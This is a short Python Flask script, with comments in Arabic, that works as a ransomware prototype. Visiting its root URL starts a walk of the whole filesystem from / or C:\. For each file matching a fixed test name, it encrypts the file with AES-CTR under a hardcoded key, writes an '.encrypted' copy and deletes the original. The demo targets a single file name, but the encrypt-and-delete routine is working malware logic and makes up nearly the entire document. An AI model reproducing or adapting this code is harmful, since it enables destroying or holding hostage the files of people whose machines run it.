from flask import Flask
import os
import platform
import pyaes

app = Flask(__name__)

# دالة لتشفير الملف
def encrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            file_data = f.read()

        aes = pyaes.AESModeOfOperationCTR(key)
        encrypted_data = aes.encrypt(file_data)

        new_file_path = file_path + ".encrypted"
        with open(new_file_path, 'wb') as f:
            f.write(encrypted_data)

        os.remove(file_path)
        print(f"File encrypted: {new_file_path}")

    except Exception as e:
        print(f"Error encrypting file {file_path}: {str(e)}")


# دالة للبحث عن الملفات بالتسمية المحددة
def find_and_encrypt_files(file_name, key):
    search_path = '/'
    if platform.system() == 'Windows':
        search_path = 'C:\\'

    for root, dirs, files in os.walk(search_path):
        for file in files:
            if file == file_name:
                file_path = os.path.join(root, file)
                print(f"Encrypting file: {file_path}")
                encrypt_file(file_path, key)


# تحديد مفتاح التشفير (16 بايت)
encryption_key = b'Sixteen byte key'

@app.route('/')
def home():
    # استدعاء التشفير عند زيارة الرابط
    find_and_encrypt_files('testrnsomwareppo.txt', encryption_key)
    return "Files are being encrypted!"

if __name__ == "__main__":
    app.run(debug=True)
